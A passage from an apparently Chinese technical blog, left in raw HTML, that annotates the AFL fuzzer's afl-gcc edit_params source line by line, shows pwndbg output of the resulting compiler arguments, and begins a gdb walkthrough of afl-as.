参数数组中</p></li></ul></li><li><p>附加参数：</p><ul><li>-B as_path</li><li>-O3：启用一系列优化措施，以提高程序的运行速度和效率</li><li>-funroll-loops：启用循环展开优化减少循环控制的开销</li><li>-D__AFL_COMPILER&#x3D;1：指示编译器正在使用 AFL</li><li>-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION&#x3D;1：指示当前的编译模式是为模糊测试准备的，而不是用于生产环境</li></ul></li><li><p>在一定条件下附加参数：</p><ul><li><p>是 clang 模式：加上参数 -no-integrated-as，禁用 Clang 的内置汇编器</p></li><li><p>存在全局变量 AFL_HARDEN ：加上参数 -fstack-protector-all，启用堆栈保护，即canary</p></li><li><p>fortify_set &#x3D; 1：加上参数 -D_FORTIFY_SOURCE&#x3D;2，增强标准库函数的安全性，检查标准库函数（如 memcpy、strcpy 等）的参数是否可能导致缓冲区溢出</p></li><li><p>存在参数 -fsanitize&#x3D;address  或 -fsanitize&#x3D;memory：设置环境变量 AFL_USE_ASAN 为 1</p></li><li><p>存在环境变量 AFL_USE_ASAN &#x2F; AFL_USE_MSAN</p><ul><li>同时存在环境变量 AFL_USE_MSAN &#x2F; AFL_HARDEN 则报错</li><li>参数加上 -U_FORTIFY_SOURCE 和 -fsanitize&#x3D;address</li></ul></li><li><p>不是 FreeBSD 系统：加 -g 在编译时生成调试信息</p></li><li><p>存在环境变量 AFL_NO_BUILTIN ：附加一系列参数禁用编译器对一系列 str 和 cmp 类函数的内置优化，确保使用标准库中定义的strcmp函数</p></li></ul></li><li><p>在参数列表末尾加上 NULL 表示结束</p></li></ul><p>最后得到</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">pwndbg<span class="token operator">></span> tele <span class="token number">0x55555555a308</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsi r15 <span class="token number">0x55555555a308</span> —▸ <span class="token number">0x5555555576ac</span> ◂— <span class="token number">0x5f4c464100636367</span> <span class="token comment">/* 'gcc' */</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│         <span class="token number">0x55555555a310</span> —▸ <span class="token number">0x7fffffffe247</span> ◂— <span class="token number">0x2d00632e74736574</span> <span class="token comment">/* 'test.c' */</span><span class="token number">02</span><span class="token operator">:</span><span class="token number">0010</span>│         <span class="token number">0x55555555a318</span> —▸ <span class="token number">0x7fffffffe24e</span> ◂— <span class="token number">0x74736574006f2d</span> <span class="token comment">/* '-o' */</span><span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│         <span class="token number">0x55555555a320</span> —▸ <span class="token number">0x7fffffffe251</span> ◂— <span class="token number">0x534a470074736574</span> <span class="token comment">/* 'test' */</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│         <span class="token number">0x55555555a328</span> —▸ <span class="token number">0x555555557794</span> ◂— <span class="token number">0x692d6f6e2d00422d</span> <span class="token comment">/* '-B' */</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│         <span class="token number">0x55555555a330</span> —▸ <span class="token number">0x55555555a2a8</span> ◂— <span class="token char">'/home/starrysky/AFL'</span><span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│         <span class="token number">0x55555555a338</span> —▸ <span class="token number">0x55555555781c</span> ◂— <span class="token number">0x2d00334f2d00672d</span> <span class="token comment">/* '-g' */</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│         <span class="token number">0x55555555a340</span> —▸ <span class="token number">0x55555555781f</span> ◂— <span class="token number">0x6e75662d00334f2d</span> <span class="token comment">/* '-O3' */</span>pwndbg<span class="token operator">></span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">0040</span>│  <span class="token number">0x55555555a348</span> —▸ <span class="token number">0x555555557823</span> ◂— <span class="token char">'-funroll-loops'</span><span class="token number">09</span><span class="token operator">:</span><span class="token number">0048</span>│  <span class="token number">0x55555555a350</span> —▸ <span class="token number">0x555555557832</span> ◂— <span class="token char">'-D__AFL_COMPILER=1'</span><span class="token number">0</span>a<span class="token operator">:</span><span class="token number">0050</span>│  <span class="token number">0x55555555a358</span> —▸ <span class="token number">0x555555557610</span> ◂— '<span class="token operator">-</span>DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION<span class="token operator">=</span><span class="token number">1</span>'<span class="token number">0</span>b<span class="token operator">:</span><span class="token number">0058</span>│  <span class="token number">0x55555555a360</span> ◂— <span class="token number">0x0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">edit_params</span><span class="token punctuation">(</span>u32 argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u8 fortify_set <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> asan_set <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  u8 <span class="token operator">*</span>name<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>__FreeBSD__<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">defined</span><span class="token punctuation">(</span>__x86_64__<span class="token punctuation">)</span></span></span>  u8 m32_set <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>  cc_params <span class="token operator">=</span> <span class="token function">ck_alloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>argc <span class="token operator">+</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//为 cc_params 开辟空间,本例中 argc = 4</span>  name <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//找到最后一个"/"的位置,也就是"../AFL/afl-gcc"中的第二个"/"位置</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>name<span class="token punctuation">)</span> name <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">else</span> name<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//如果存在"/",则 name 为"/"下一个位置即"afl-gcc",如果不存在也就是直接使用了 AFL_PATH 中的 afl-gcc 则 name 直接等于 argv[0]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">"afl-clang"</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//判断是否为 afl-clang</span>    clang_mode <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">setenv</span><span class="token punctuation">(</span>CLANG_ENV_VAR<span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//是 afl-clang 则设置 clang_mode = 1 且设置环境变量 CLANG_ENV_VAR 为 1</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">"afl-clang++"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//进一步判断是否是 afl-clang++</span>      u8<span class="token operator">*</span> alt_cxx <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_CXX"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      cc_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> alt_cxx <span class="token operator">?</span> alt_cxx <span class="token operator">:</span> <span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"clang++"</span><span class="token punctuation">;</span><span class="token comment">//是 afl-clang++ 则设置 cc_params[0] 为环境变量里的 AFL_CXX 或者 clang++</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      u8<span class="token operator">*</span> alt_cc <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_CC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      cc_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> alt_cc <span class="token operator">?</span> alt_cc <span class="token operator">:</span> <span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"clang"</span><span class="token punctuation">;</span><span class="token comment">//是 afl-clang 则设置 cc_params[0] 为环境变量里的 AFL_CC 或者 clang</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span><span class="token comment">//如果是苹果平台</span></span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span><span class="token comment">//本例是在linux, 最终 cc_params[0] = gcc</span></span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">"afl-g++"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果是 afl-g++ 则设置 cc_params[0] 为环境变量中 AFL_CXX 的值或 g++</span>      u8<span class="token operator">*</span> alt_cxx <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_CXX"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      cc_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> alt_cxx <span class="token operator">?</span> alt_cxx <span class="token operator">:</span> <span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"g++"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">"afl-gcj"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果是 afl-gcj 则设置 cc_params[0] 为环境变量中 "AFL_GCJ 的值或 gcj,用于编译 java</span>      u8<span class="token operator">*</span> alt_cc <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_GCJ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      cc_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> alt_cc <span class="token operator">?</span> alt_cc <span class="token operator">:</span> <span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"gcj"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果是其他指令, 设置 cc_params[0] 为环境变量中 "AFL_CC 的值或 gcc</span>      u8<span class="token operator">*</span> alt_cc <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_CC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      cc_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> alt_cc <span class="token operator">?</span> alt_cc <span class="token operator">:</span> <span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"gcc"</span><span class="token punctuation">;</span><span class="token comment">//本例中未获取到环境变量所以直接设置为 gcc</span>    <span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* __APPLE__ */</span></span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>argc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//第一个参数处理完参数数量减1,遍历其他参数</span>    u8<span class="token operator">*</span> cur <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">++</span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取下一个参数的位置</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token string">"-B"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//处理参数 -B,用于指定工具链或库文件的参数,这里会跳过 -B 和它的值</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>be_quiet<span class="token punctuation">)</span> <span class="token function">WARNF</span><span class="token punctuation">(</span><span class="token string">"-B is already set, overriding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//be_quiet 为 0 则提示已经设置过</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>cur<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> argc <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> argc<span class="token operator">--</span><span class="token punctuation">;</span> argv<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token comment">//跳过 -B 后面的参数</span>      <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token string">"-integrated-as"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token comment">//跳过参数 -integrated-as</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token string">"-pipe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token comment">//跳过参数 -pipe</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>__FreeBSD__<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">defined</span><span class="token punctuation">(</span>__x86_64__<span class="token punctuation">)</span></span><span class="token comment">//如果是 FreeBSD 系统并且是 x86-64架构,本例中不是</span></span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token string">"-m32"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> m32_set <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token string">"-fsanitize=address"</span><span class="token punctuation">)</span> <span class="token operator">||</span>        <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token string">"-fsanitize=memory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> asan_set <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//存在 -fsanitize=address  或 -fsanitize=memory 则设置 asan_set = 1</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token string">"FORTIFY_SOURCE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> fortify_set <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//存在 FORTIFY_SOURCE 则设置 fortify_set = 1</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> cur<span class="token punctuation">;</span><span class="token comment">//将当前参数存到 cc_params 数组中</span>  <span class="token punctuation">&#125;</span>  cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-B"</span><span class="token punctuation">;</span>  cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> as_path<span class="token punctuation">;</span><span class="token comment">//参数数组增加 -B as_path 指定 afl-as 位置</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>clang_mode<span class="token punctuation">)</span><span class="token comment">//如果是 clang 模式则加上参数 -no-integrated-as,禁用 Clang 的内置汇编器</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-no-integrated-as"</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_HARDEN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果存在全局变量 AFL_HARDEN 则加上参数 -fstack-protector-all,启用堆栈保护,即canary</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fstack-protector-all"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fortify_set<span class="token punctuation">)</span><span class="token comment">//如果 fortify_set = 1 再加上参数 -D_FORTIFY_SOURCE=2,增强标准库函数的安全性,检查标准库函数（如 memcpy、strcpy 等）的参数是否可能导致缓冲区溢出</span>      cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-D_FORTIFY_SOURCE=2"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>asan_set<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//存在参数 -fsanitize=address  或 -fsanitize=memory </span>    <span class="token comment">/* Pass this on to afl-as to adjust map density.将其传递给 afl-as 来调整 map density */</span>    <span class="token function">setenv</span><span class="token punctuation">(</span><span class="token string">"AFL_USE_ASAN"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置环境变量 AFL_USE_ASAN 为 1</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_USE_ASAN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果存在环境变量 AFL_USE_ASAN</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_USE_MSAN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"ASAN and MSAN are mutually exclusive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//同时存在环境变量 AFL_USE_MSAN 则报错</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_HARDEN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"ASAN and AFL_HARDEN are mutually exclusive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//同时存在环境变量 AFL_HARDEN 则报错</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-U_FORTIFY_SOURCE"</span><span class="token punctuation">;</span><span class="token comment">//参数加上 -U_FORTIFY_SOURCE</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fsanitize=address"</span><span class="token punctuation">;</span><span class="token comment">//参数加上 -fsanitize=address</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_USE_MSAN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//同上</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_USE_ASAN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"ASAN and MSAN are mutually exclusive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_HARDEN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"MSAN and AFL_HARDEN are mutually exclusive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-U_FORTIFY_SOURCE"</span><span class="token punctuation">;</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fsanitize=memory"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_DONT_OPTIMIZE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>__FreeBSD__<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">defined</span><span class="token punctuation">(</span>__x86_64__<span class="token punctuation">)</span></span></span>    <span class="token comment">//源码注释翻译：在 64 位 FreeBSD 系统上，clang -g -m32 出现故障，但 -m32 本身可以正常工作</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>clang_mode <span class="token operator">||</span> <span class="token operator">!</span>m32_set<span class="token punctuation">)</span>      cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-g"</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span><span class="token comment">//因为不是 FreeBSD 系统所以直接在参数后面加 -g,用于在编译时生成调试信息</span></span>      cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-g"</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-O3"</span><span class="token punctuation">;</span><span class="token comment">//加上参数 -O3,启用一系列优化措施，以提高程序的运行速度和效率</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-funroll-loops"</span><span class="token punctuation">;</span><span class="token comment">//加上参数 -funroll-loops,启用循环展开优化减少循环控制的开销</span>    <span class="token comment">//源码注释翻译：您正在为模糊测试构建两个指标；其中一个是 AFL 专用的，另一个与 libfuzzer 共享</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-D__AFL_COMPILER=1"</span><span class="token punctuation">;</span><span class="token comment">//指示编译器正在使用 AFL</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1"</span><span class="token punctuation">;</span><span class="token comment">//指示当前的编译模式是为模糊测试准备的，而不是用于生产环境</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_NO_BUILTIN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//存在环境变量 AFL_NO_BUILTIN</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fno-builtin-strcmp"</span><span class="token punctuation">;</span><span class="token comment">//禁用编译器对 strcmp 函数的内置优化,确保代码使用标准库中定义的 strcmp 函数</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fno-builtin-strncmp"</span><span class="token punctuation">;</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fno-builtin-strcasecmp"</span><span class="token punctuation">;</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fno-builtin-strncasecmp"</span><span class="token punctuation">;</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fno-builtin-memcmp"</span><span class="token punctuation">;</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fno-builtin-strstr"</span><span class="token punctuation">;</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fno-builtin-strcasestr"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token comment">//参数列表末尾加上 NULL 表示结束</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="afl-as"><a href="#afl-as" class="headerlink" title="afl-as"></a>afl-as</h2><h3 id="gdb调试-1"><a href="#gdb调试-1" class="headerlink" title="gdb调试"></a>gdb调试</h3><p>在 gcc 里找不到在哪跟进到 afl-as，直接曲线救国…把 test.s 放到 &#x2F;tmp 模拟 afl-gcc 生成的临时文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-S</span> test.c <span class="token parameter variable">-o</span> test.s<span class="token function">sudo</span> <span class="token function">cp</span> test.s /tmpgdb ~/AFL/afl-as<span class="token builtin class-name">set</span> args /tmp/test.s<span class="token function">dir</span> <span class="token punctuation">..</span>/AFLb mainr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="main-1"><a 